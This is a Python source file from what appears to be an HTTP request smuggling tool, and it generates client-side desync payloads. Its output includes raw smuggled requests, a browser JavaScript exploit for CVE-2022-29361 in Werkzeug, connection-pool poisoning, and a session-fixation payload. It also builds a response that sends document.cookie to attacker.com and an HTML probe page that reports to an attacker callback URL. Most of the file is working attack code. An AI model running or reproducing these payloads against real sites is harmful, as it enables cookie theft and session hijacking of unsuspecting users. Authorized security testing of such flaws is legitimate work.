"""Client-Side Desync (CSD) payload generator.

Client-Side Desync attacks target the browser-to-server connection
rather than proxy-to-backend. These attacks:
- Poison the browser's connection pool
- Affect only the victim who triggers the attack
- Can be used for XSS, credential theft, etc.

CSD requires the victim to visit attacker-controlled page that
sends malformed requests via fetch() or similar APIs.
"""

from typing import List, Tuple, Dict, Any
from urllib.parse import urlparse

from http_smuggler.core.models import (
    Endpoint,
    SmugglingVariant,
    DetectionMethod,
)
from http_smuggler.payloads.generator import (
    Payload,
    PayloadGenerator,
    PayloadCategory,
)


class ClientSideDesyncPayloadGenerator(PayloadGenerator):
    """Generator for Client-Side Desync (CSD) payloads.
    
    These payloads are designed to be triggered from attacker-controlled
    JavaScript in a victim's browser.
    """
    
    @property
    def variant(self) -> SmugglingVariant:
        return SmugglingVariant.CLIENT_SIDE
    
    @property
    def name(self) -> str:
        return "Client-Side Desync Generator"
    
    def _extract_host_path(self, endpoint: Endpoint) -> Tuple[str, str]:
        """Extract host and path from endpoint."""
        parsed = urlparse(endpoint.url)
        host = parsed.hostname or ""
        if parsed.port and parsed.port not in (80, 443):
            host = f"{host}:{parsed.port}"
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        return host, path
    
    def _extract_origin(self, endpoint: Endpoint) -> str:
        """Extract origin from endpoint URL."""
        parsed = urlparse(endpoint.url)
        scheme = parsed.scheme or "https"
        host = parsed.hostname or ""
        if parsed.port and parsed.port not in (80, 443):
            return f"{scheme}://{host}:{parsed.port}"
        return f"{scheme}://{host}"
    
    def generate_timing_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate CSD timing detection payloads.
        
        These detect if a server is vulnerable to CSD by checking
        connection behavior with malformed requests.
        """
        host, path = self._extract_host_path(endpoint)
        origin = self._extract_origin(endpoint)
        payloads = []
        
        # CSD timing: CL.0 variant (Content-Length ignored)
        # Server processes request with CL header but ignores body
        headers1 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 100\r\n"  # Claims 100 bytes
            f"\r\n"
        )
        body1 = "x=1"  # Only 3 bytes
        
        payloads.append(Payload(
            name="CSD-timing-cl0",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=(headers1 + body1).encode(),
            description="CSD CL.0 timing - Content-Length ignored",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Server responds without waiting for 100 bytes",
            expected_timeout=3.0,  # Should be fast if CL ignored
            metadata={
                "attack_type": "cl_0",
                "origin": origin,
                "js_payload": self._generate_js_timing_test(origin, path),
            },
        ))
        
        # CSD timing: H2 to H1 desync potential
        # Check if H2 connection can be desync'd
        payloads.append(Payload(
            name="CSD-timing-h2-check",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=(headers1 + body1).encode(),
            description="CSD H2 connection desync timing check",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Detect H2 connection pooling behavior",
            expected_timeout=5.0,
            metadata={
                "attack_type": "h2_desync",
                "requires_h2": True,
            },
        ))
        
        # CVE-2022-29361: Werkzeug browser desync (keep-alive poisoning)
        # Werkzeug v2.1.0 with threaded=True allows keep-alive connections
        # The desync occurs when a malformed request body poisons the queue
        # This matches the TryHackMe attack pattern exactly
        smuggled_request = "GET /redirect HTTP/1.1\r\nFoo: x"
        werkzeug_payload = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(smuggled_request)}\r\n"
            f"\r\n"
            f"{smuggled_request}"
        )
        
        payloads.append(Payload(
            name="CSD-werkzeug-desync",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=werkzeug_payload.encode(),
            description="CVE-2022-29361 Werkzeug browser desync via keep-alive poisoning",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Next request on same connection gets redirected to /redirect (404)",
            expected_timeout=5.0,
            metadata={
                "attack_type": "werkzeug_desync",
                "cve": "CVE-2022-29361",
                "affected_versions": "Werkzeug <= 2.1.0",
                "requires_keepalive": True,
                "js_exploit": self._generate_werkzeug_js_exploit(origin, path),
            },
        ))
        
        # Werkzeug variant 2: Various Content-Length mismatches
        # Some servers handle CL differently, test with embedded GET
        werkzeug_payload2 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: 50\r\n"
            f"\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Ignore: "
        )
        
        payloads.append(Payload(
            name="CSD-werkzeug-admin",
            variant=self.variant,
            category=PayloadCategory.TIMING,
            raw_request=werkzeug_payload2.encode(),
            description="CVE-2022-29361 Werkzeug desync targeting /admin",
            detection_method=DetectionMethod.TIMING,
            expected_behavior="Next request sees /admin response",
            expected_timeout=5.0,
            metadata={
                "attack_type": "werkzeug_desync",
                "cve": "CVE-2022-29361",
                "target_path": "/admin",
            },
        ))
        
        return payloads
    
    def _generate_werkzeug_js_exploit(self, origin: str, path: str) -> str:
        """Generate JavaScript exploit for CVE-2022-29361 Werkzeug desync.
        
        This is the exact pattern used in the TryHackMe room.
        """
        return f'''
// CVE-2022-29361 Werkzeug Browser Desync Exploit
// Run this in browser console targeting a vulnerable Werkzeug server
fetch('{origin}{path}', {{
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\\r\\nFoo: x',
    mode: 'cors',
}}).then(() => {{
    // Connection is now poisoned
    // Refresh page to see the desync effect (404 from /redirect)
    console.log('Connection poisoned - refresh to trigger desync');
}}).catch(e => {{
    // CORS error expected but request still sent
    console.log('Request sent (CORS error expected):', e);
}});
'''
    
    def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
        """Generate CSD differential detection payloads.
        
        These payloads poison the browser connection pool to
        affect subsequent requests from the same browser.
        """
        host, path = self._extract_host_path(endpoint)
        origin = self._extract_origin(endpoint)
        payloads = []
        
        # CSD CL.0 smuggle - poison browser connection
        smuggled = f"GET /csd_smuggled HTTP/1.1\r\nHost: {host}\r\n\r\n"
        
        payload1 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(smuggled)}\r\n"
            f"\r\n"
            f"{smuggled}"
        )
        
        payloads.append(Payload(
            name="CSD-diff-cl0-smuggle",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload1.encode(),
            description="CSD CL.0 connection pool poisoning",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Victim's next request receives smuggled response",
            poison_prefix="GET /csd_smuggled",
            metadata={
                "attack_type": "cl_0_smuggle",
                "origin": origin,
                "js_exploit": self._generate_js_exploit(origin, path, smuggled),
            },
        ))
        
        # CSD to steal credentials - redirect to attacker
        xss_response = (
            f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: text/html\r\n"
            f"Content-Length: 100\r\n"
            f"\r\n"
            f"<script>location='https://attacker.com/?c='+document.cookie</script>"
        )
        
        # This attempts to get the smuggled response cached/served
        smuggled2 = (
            f"GET /api/user HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Inject: "
        )
        
        payload2 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(smuggled2)}\r\n"
            f"\r\n"
            f"{smuggled2}"
        )
        
        payloads.append(Payload(
            name="CSD-diff-credential-steal",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload2.encode(),
            description="CSD credential stealing via connection poisoning",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Victim's /api/user request hijacked",
            poison_prefix="GET /api/user",
            metadata={
                "attack_type": "credential_steal",
                "target_path": "/api/user",
            },
        ))
        
        # CSD header injection for session hijacking
        smuggled3 = (
            f"GET /user/profile HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Cookie: session=attacker_session\r\n"
            f"\r\n"
        )
        
        payload3 = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(smuggled3)}\r\n"
            f"\r\n"
            f"{smuggled3}"
        )
        
        payloads.append(Payload(
            name="CSD-diff-session-fixation",
            variant=self.variant,
            category=PayloadCategory.DIFFERENTIAL,
            raw_request=payload3.encode(),
            description="CSD session fixation attack",
            detection_method=DetectionMethod.DIFFERENTIAL,
            expected_behavior="Victim request uses attacker session",
            poison_prefix="GET /user/profile",
            metadata={
                "attack_type": "session_fixation",
                "injected_cookie": "session=attacker_session",
            },
        ))
        
        return payloads
    
    def _generate_js_timing_test(self, origin: str, path: str) -> str:
        """Generate JavaScript for timing-based CSD detection.
        
        This code can be used in an attacker's page to test for CSD.
        """
        return f'''
// CSD Timing Test
async function csdTimingTest() {{
    const body = new Blob(['x'.repeat(100)]);
    const start = performance.now();
    
    try {{
        const response = await fetch('{origin}{path}', {{
            method: 'POST',
            body: body,
            mode: 'no-cors',
            cache: 'no-cache',
        }});
        
        const elapsed = performance.now() - start;
        
        // If response is fast (< 3s), server may ignore Content-Length
        if (elapsed < 3000) {{
            console.log('Potential CSD vulnerability detected');
            return true;
        }}
    }} catch (e) {{
        console.log('Request failed:', e);
    }}
    
    return false;
}}
'''
    
    def _generate_js_exploit(
        self,
        origin: str,
        path: str,
        smuggled: str,
    ) -> str:
        """Generate JavaScript exploit for CSD.
        
        This code poisons the connection pool and triggers
        the smuggled request on victim's next navigation.
        """
        # Escape smuggled request for JavaScript
        smuggled_escaped = smuggled.replace("\\", "\\\\").replace("'", "\\'").replace("\r\n", "\\r\\n")
        
        return f'''
// CSD Exploit - Connection Pool Poisoning
async function csdExploit() {{
    // Create a body that includes the smuggled request
    const smuggled = '{smuggled_escaped}';
    const body = smuggled;
    
    // Send the poisoning request
    try {{
        await fetch('{origin}{path}', {{
            method: 'POST',
            body: body,
            mode: 'no-cors',
            cache: 'no-cache',
            headers: {{
                'Content-Type': 'application/x-www-form-urlencoded',
            }},
            keepalive: true,  // Keep connection in pool
        }});
        
        // The connection is now poisoned
        // Victim's next request to this origin will receive smuggled response
        console.log('Connection poisoned');
        
        // Trigger victim navigation to target
        // window.location = '{origin}/sensitive-page';
        
    }} catch (e) {{
        console.log('Exploit failed:', e);
    }}
}}

// Trigger on page load
csdExploit();
'''
    
    def generate_detection_page(
        self,
        endpoint: Endpoint,
        callback_url: str = "https://attacker.com/callback",
    ) -> str:
        """Generate full HTML page for CSD detection.
        
        Args:
            endpoint: Target endpoint
            callback_url: URL to call back with results
        
        Returns:
            HTML page content
        """
        host, path = self._extract_host_path(endpoint)
        origin = self._extract_origin(endpoint)
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>CSD Detection</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
    async function detectCSD() {{
        const results = {{}};
        
        // Test 1: CL.0 timing
        const cl0Start = performance.now();
        try {{
            await fetch('{origin}{path}', {{
                method: 'POST',
                body: 'x=1',
                headers: {{
                    'Content-Length': '100',
                    'Content-Type': 'application/x-www-form-urlencoded',
                }},
                mode: 'no-cors',
            }});
            results.cl0_time = performance.now() - cl0Start;
        }} catch (e) {{
            results.cl0_error = e.message;
        }}
        
        // Test 2: Connection reuse check
        try {{
            await fetch('{origin}{path}', {{ mode: 'no-cors' }});
            await fetch('{origin}{path}', {{ mode: 'no-cors' }});
            results.conn_reuse = true;
        }} catch (e) {{
            results.conn_reuse = false;
        }}
        
        // Report results
        const img = new Image();
        img.src = '{callback_url}?' + new URLSearchParams(results);
        
        document.body.innerHTML = '<h1>Detection complete</h1>';
    }}
    
    detectCSD();
    </script>
</body>
</html>
'''

